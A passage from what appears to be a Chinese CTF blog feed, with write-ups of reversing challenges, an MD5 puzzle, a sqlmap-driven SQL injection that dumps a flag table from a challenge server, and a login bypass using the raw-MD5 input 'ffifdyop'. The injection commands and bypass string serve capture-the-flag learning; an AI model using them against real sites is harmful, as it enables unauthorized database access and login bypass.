data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/6.png" class="lazyload"></a></p><h2 id="发现输入的长度有限制，输入的长度应该是14位"><a href="#发现输入的长度有限制，输入的长度应该是14位" class="headerlink" title="发现输入的长度有限制，输入的长度应该是14位"></a>发现输入的长度有限制，输入的长度应该是14位</h2><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/7.png" class="lazyload"></a></p><h1 id="我重新输入一些数值，再次调试"><a href="#我重新输入一些数值，再次调试" class="headerlink" title="我重新输入一些数值，再次调试"></a>我重新输入一些数值，再次调试</h1><h2 id="发现不会出现跳转，于是继续单步"><a href="#发现不会出现跳转，于是继续单步" class="headerlink" title="发现不会出现跳转，于是继续单步"></a>发现不会出现跳转，于是继续单步</h2><h1 id="这里就是对key进行-xor-0x20"><a href="#这里就是对key进行-xor-0x20" class="headerlink" title="这里就是对key进行 xor 0x20"></a>这里就是对key进行 xor 0x20</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/8.png" class="lazyload"></a></p><h1 id="我们发现可疑的字符出现，我们在数据窗口找到它"><a href="#我们发现可疑的字符出现，我们在数据窗口找到它" class="headerlink" title="我们发现可疑的字符出现，我们在数据窗口找到它"></a>我们发现可疑的字符出现，我们在数据窗口找到它</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/9.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0019F754  68 57 19 48 50 6E 58 78 54 6A 19 58 5E 06        hWHPnXxTjX^</span><br></pre></td></tr></tbody></table></figure></div><h1 id="然后继续单步，发现字符发生变化，于是我们将变化的字符记录下来"><a href="#然后继续单步，发现字符发生变化，于是我们将变化的字符记录下来" class="headerlink" title="然后继续单步，发现字符发生变化，于是我们将变化的字符记录下来"></a>然后继续单步，发现字符发生变化，于是我们将变化的字符记录下来</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0019F754  63 52 14 43 4B 69 53 73 4F 65 14 53 59 01        cRCKiSsOeSY</span><br></pre></td></tr></tbody></table></figure></div><h1 id="发现这里的比较数据-恰好是我们的key-xor-0x20后与可疑字符变换后相比较，根据xor的可逆性，我们用python把密文逆回去"><a href="#发现这里的比较数据-恰好是我们的key-xor-0x20后与可疑字符变换后相比较，根据xor的可逆性，我们用python把密文逆回去" class="headerlink" title="发现这里的比较数据 恰好是我们的key xor 0x20后与可疑字符变换后相比较，根据xor的可逆性，我们用python把密文逆回去"></a>发现这里的比较数据 恰好是我们的key xor 0x20后与可疑字符变换后相比较，根据xor的可逆性，我们用python把密文逆回去</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.strxor import strxor</span><br><span class="line">str = "\x63\x52\x14\x43\x4B\x69\x53\x73\x4F\x65\x14\x53\x59\x01"</span><br><span class="line">str = strxor(str,("\x20" * 14))</span><br><span class="line">print str</span><br></pre></td></tr></tbody></table></figure></div><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re3/11.png" class="lazyload"></a></p><h3 id="答案：flag-Cr4ckIsSoE4sy"><a href="#答案：flag-Cr4ckIsSoE4sy" class="headerlink" title="答案：flag{Cr4ckIsSoE4sy!}"></a>答案：flag{Cr4ckIsSoE4sy!}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-成都大学网络攻防-Re2</title>
      <link href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re2/"/>
      <url>/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="蕾蕾姐打开OD看到里面的东西陷入了沉思，难道你看不出来这是经过加密的flag吗？"><a href="#蕾蕾姐打开OD看到里面的东西陷入了沉思，难道你看不出来这是经过加密的flag吗？" class="headerlink" title="蕾蕾姐打开OD看到里面的东西陷入了沉思，难道你看不出来这是经过加密的flag吗？"></a>蕾蕾姐打开OD看到里面的东西陷入了沉思，难道你看不出来这是经过加密的flag吗？</h2><h1 id="分值：150"><a href="#分值：150" class="headerlink" title="分值：150"></a>分值：150</h1><h1 id="格式：flag"><a href="#格式：flag" class="headerlink" title="格式：flag{ }"></a>格式：flag{ }</h1><p>下载文件<a href="RE2.rar">RE2.rar</a></p><h1 id="将程序导入OD，然后搜索字符串"><a href="#将程序导入OD，然后搜索字符串" class="headerlink" title="将程序导入OD，然后搜索字符串"></a>将程序导入OD，然后搜索字符串</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re2/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re2/1.png" class="lazyload"></a></p><h1 id="发现很明显的提示，说明下面文字的这个是密文"><a href="#发现很明显的提示，说明下面文字的这个是密文" class="headerlink" title="发现很明显的提示，说明下面文字的这个是密文"></a>发现很明显的提示，说明下面文字的这个是密文</h1><p><code>ZmxhZ3tDb25ncmF0dWxhdGlvbnMhVGhlX3JldmVyc2VfaXNfaW50ZXJlc3RpbmchfQ==</code></p><h2 id="很明显这是一个base64加密"><a href="#很明显这是一个base64加密" class="headerlink" title="很明显这是一个base64加密"></a>很明显这是一个base64加密</h2><h2 id="我们可以选择直接在线解密"><a href="#我们可以选择直接在线解密" class="headerlink" title="我们可以选择直接在线解密"></a>我们可以选择直接在线解密</h2><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re2/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re2/2.png" class="lazyload"></a></p><h2 id="flag-Congratulations-The-reverse-is-interesting"><a href="#flag-Congratulations-The-reverse-is-interesting" class="headerlink" title="flag{Congratulations!The_reverse_is_interesting!}"></a>flag{Congratulations!The_reverse_is_interesting!}</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-成都大学网络攻防-Re1</title>
      <link href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/"/>
      <url>/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="有一天蕾蕾姐突然跟我说，我要学逆向。那么问题就来了，你会用OD吗？"><a href="#有一天蕾蕾姐突然跟我说，我要学逆向。那么问题就来了，你会用OD吗？" class="headerlink" title="有一天蕾蕾姐突然跟我说，我要学逆向。那么问题就来了，你会用OD吗？"></a>有一天蕾蕾姐突然跟我说，我要学逆向。那么问题就来了，你会用OD吗？</h2><h1 id="分值：100"><a href="#分值：100" class="headerlink" title="分值：100"></a>分值：100</h1><h1 id="格式：flag"><a href="#格式：flag" class="headerlink" title="格式：flag{ }"></a>格式：flag{ }</h1><p>点击下载<a href="RE1.RAR">RE1.rar</a></p><h1 id="将程序导入OD"><a href="#将程序导入OD" class="headerlink" title="将程序导入OD"></a>将程序导入OD</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/1.png" class="lazyload"></a></p><h1 id="搜索字符串"><a href="#搜索字符串" class="headerlink" title="搜索字符串"></a>搜索字符串</h1><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/2.png" class="lazyload"></a></p><h2 id="发现可疑字符串"><a href="#发现可疑字符串" class="headerlink" title="发现可疑字符串"></a>发现可疑字符串</h2><h2 id="然后到可疑字符串处下断点"><a href="#然后到可疑字符串处下断点" class="headerlink" title="然后到可疑字符串处下断点"></a>然后到可疑字符串处下断点</h2><p><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/3.png" class="lazyload"></a></p><h2 id="F8运行到断点处，并单步到00401560，然后在数据窗口定位到00401560处，可以发现flag"><a href="#F8运行到断点处，并单步到00401560，然后在数据窗口定位到00401560处，可以发现flag" class="headerlink" title="F8运行到断点处，并单步到00401560，然后在数据窗口定位到00401560处，可以发现flag"></a>F8运行到断点处，并单步到00401560，然后在数据窗口定位到00401560处，可以发现flag</h2><h3 id="flag-Welcome-To-RE-World"><a href="#flag-Welcome-To-RE-World" class="headerlink" title="flag{Welcome_To_RE_World!}"></a>flag{Welcome_To_RE_World!}</h3><p>当然如果实力不强的话，可以选择继续单步，然后输入key，最后会在 0040156A 发现flag<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-Re1/4.png" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-成都大学网络攻防-简单注入</title>
      <link href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="题目：简单的注入"><a href="#题目：简单的注入" class="headerlink" title="题目：简单的注入"></a>题目：简单的注入</h3><h2 id="分值：100"><a href="#分值：100" class="headerlink" title="分值：100"></a>分值：100</h2><p>我们打开网页，然后大致看一下构造<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/1.png" class="lazyload"></a></p><h1 id="发现可注入点，我们使用sqlmap来进行注入，先检测是否可以注入"><a href="#发现可注入点，我们使用sqlmap来进行注入，先检测是否可以注入" class="headerlink" title="发现可注入点，我们使用sqlmap来进行注入，先检测是否可以注入"></a>发现可注入点，我们使用sqlmap来进行注入，先检测是否可以注入</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://ctf.cdusec.org:8083/sqli.php?id=1"</span><br></pre></td></tr></tbody></table></figure></div><p>执行命令<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/2.png" class="lazyload"></a></p><h2 id="发现可以注入"><a href="#发现可以注入" class="headerlink" title="发现可以注入"></a>发现可以注入</h2><h1 id="然后再查询它的数据库有哪些"><a href="#然后再查询它的数据库有哪些" class="headerlink" title="然后再查询它的数据库有哪些"></a>然后再查询它的数据库有哪些</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://ctf.cdusec.org:8083/sqli.php?id=1" --dbs</span><br></pre></td></tr></tbody></table></figure></div><p>执行命令<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/3.png" class="lazyload"></a></p><h2 id="发现有两个库：information-schema-news"><a href="#发现有两个库：information-schema-news" class="headerlink" title="发现有两个库：information_schema  news"></a>发现有两个库：information_schema  news</h2><h1 id="第一个一般是不会存放flag的，所以我们继续查看一下第二个库"><a href="#第一个一般是不会存放flag的，所以我们继续查看一下第二个库" class="headerlink" title="第一个一般是不会存放flag的，所以我们继续查看一下第二个库"></a>第一个一般是不会存放flag的，所以我们继续查看一下第二个库</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://ctf.cdusec.org:8083/sqli.php?id=1" --table -D news</span><br></pre></td></tr></tbody></table></figure></div><p>执行命令<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/4.png" class="lazyload"></a></p><h2 id="发现news-下面的table-有-flag和tl，很明显了-flag就是答案了，查看一下flag的长度和类型"><a href="#发现news-下面的table-有-flag和tl，很明显了-flag就是答案了，查看一下flag的长度和类型" class="headerlink" title="发现news 下面的table 有 flag和tl，很明显了 flag就是答案了，查看一下flag的长度和类型"></a>发现news 下面的table 有 flag和tl，很明显了 flag就是答案了，查看一下flag的长度和类型</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://ctf.cdusec.org:8083/sqli.php?id=1" --columns -T flag -D news</span><br></pre></td></tr></tbody></table></figure></div><p>执行命令<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/5.png" class="lazyload"></a></p><h1 id="发现-flag这个column是varchar-40-类型，应该就是存放flag的地方了"><a href="#发现-flag这个column是varchar-40-类型，应该就是存放flag的地方了" class="headerlink" title="发现 flag这个column是varchar(40)类型，应该就是存放flag的地方了"></a>发现 flag这个column是varchar(40)类型，应该就是存放flag的地方了</h1><h2 id="接下来我们来取出这个数据"><a href="#接下来我们来取出这个数据" class="headerlink" title="接下来我们来取出这个数据"></a>接下来我们来取出这个数据</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://ctf.cdusec.org:8083/sqli.php?id=1" --dump -C flag -T flag -D news</span><br></pre></td></tr></tbody></table></figure></div><p>执行命令<br><a href="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/22/CTF-%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/6.png" class="lazyload"></a></p><h1 id="flag已经被我们取出"><a href="#flag已经被我们取出" class="headerlink" title="flag已经被我们取出"></a>flag已经被我们取出</h1><h2 id="flag-33108bce7bd4e214"><a href="#flag-33108bce7bd4e214" class="headerlink" title="flag{33108bce7bd4e214}"></a>flag{33108bce7bd4e214}</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-手贱</title>
      <link href="/2018/11/21/CTF-JarvisOJ-Basic-%E6%89%8B%E8%B4%B1/"/>
      <url>/2018/11/21/CTF-JarvisOJ-Basic-%E6%89%8B%E8%B4%B1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="某天A君的网站被日，管理员密码被改，死活登不上，去数据库一看，啥，这密码md5不是和原来一样吗？为啥登不上咧？"><a href="#某天A君的网站被日，管理员密码被改，死活登不上，去数据库一看，啥，这密码md5不是和原来一样吗？为啥登不上咧？" class="headerlink" title="某天A君的网站被日，管理员密码被改，死活登不上，去数据库一看，啥，这密码md5不是和原来一样吗？为啥登不上咧？"></a>某天A君的网站被日，管理员密码被改，死活登不上，去数据库一看，啥，这密码md5不是和原来一样吗？为啥登不上咧？</h3><h3 id="d78b6f302l25cdc811adfe8d4e7c9fd34"><a href="#d78b6f302l25cdc811adfe8d4e7c9fd34" class="headerlink" title="d78b6f302l25cdc811adfe8d4e7c9fd34"></a>d78b6f302l25cdc811adfe8d4e7c9fd34</h3><h3 id="请提交PCTF-原来的管理员密码"><a href="#请提交PCTF-原来的管理员密码" class="headerlink" title="请提交PCTF{原来的管理员密码}"></a>请提交PCTF{原来的管理员密码}</h3><p>首先我们发现这个md5码是33位，明显不符合md5 32位的情况<br>我们把其中一位删除，然后再解密md5试试<br>我们使用python输出我们需要解密的md5</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str = "d78b6f302l25cdc811adfe8d4e7c9fd34"</span><br><span class="line">for i in range(0,33):</span><br><span class="line">    print str[0:i]+str[i+1:33]</span><br></pre></td></tr></tbody></table></figure></div><p>程序运行结果：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">78b6f302l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d8b6f302l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d7b6f302l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d786f302l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d78bf302l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6302l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f02l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f32l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f30l25cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f30225cdc811adfe8d4e7c9fd34  //这个是正确的flag</span><br><span class="line">d78b6f302l5cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l2cdc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25dc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cc811adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cd811adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc11adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc81adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc81adfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc811dfe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc811afe8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc811ade8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc811adf8d4e7c9fd34</span><br><span class="line">d78b6f302l25cdc811adfed4e7c9fd34</span><br><span class="line">d78b6f302l25cdc811adfe84e7c9fd34</span><br><span class="line">d78b6f302l25cdc811adfe8de7c9fd34</span><br><span class="line">d78b6f302l25cdc811adfe8d47c9fd34</span><br><span class="line">d78b6f302l25cdc811adfe8d4ec9fd34</span><br><span class="line">d78b6f302l25cdc811adfe8d4e79fd34</span><br><span class="line">d78b6f302l25cdc811adfe8d4e7cfd34</span><br><span class="line">d78b6f302l25cdc811adfe8d4e7c9d34</span><br><span class="line">d78b6f302l25cdc811adfe8d4e7c9f34</span><br><span class="line">d78b6f302l25cdc811adfe8d4e7c9fd4</span><br><span class="line">d78b6f302l25cdc811adfe8d4e7c9fd3</span><br></pre></td></tr></tbody></table></figure></div><p>我们一条条的粘贴进解密md5的网站[<a href="https://www.cmd5.com/]" target="_blank" rel="noopener">https://www.cmd5.com/]</a><br>最后发现d78b6f30225cdc811adfe8d4e7c9fd34是可以解出来的<br>答案是hack<br>所以flag: PCTF{hack}</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Web-Login</title>
      <link href="/2018/11/20/CTF-JarvisOJ-Web-Login/"/>
      <url>/2018/11/20/CTF-JarvisOJ-Web-Login/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h4 id="题目入口：http-web-jarvisoj-com-32772"><a href="#题目入口：http-web-jarvisoj-com-32772" class="headerlink" title="题目入口：http://web.jarvisoj.com:32772/"></a>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></h4><p>首先先F12看一下有没有php可以注入，然后没有发现注入点，但是发现了http header里面有hint。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: "select * from `admin` where password='".md5($pass,true)."'"</span><br></pre></td></tr></tbody></table></figure></div><p>那么这道题突破点只能是找到密码了。</p><p>md5($pass,true)  是将pass转化为md5，然后在转化为字符串<br>如果存在某一个md5转为hex然后再转化为字符串，且字符串= or 1 的条件，那么就可以得到flag了<br>你们可以写算法强行爆破出一种情况。<br>这里提供一个字符串: ffifdyop<br>输入这个字符串得到flag<br><a href="/2018/11/20/CTF-JarvisOJ-Web-Login/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/20/CTF-JarvisOJ-Web-Login/1.png" class="lazyload"></a></p><p>总结: 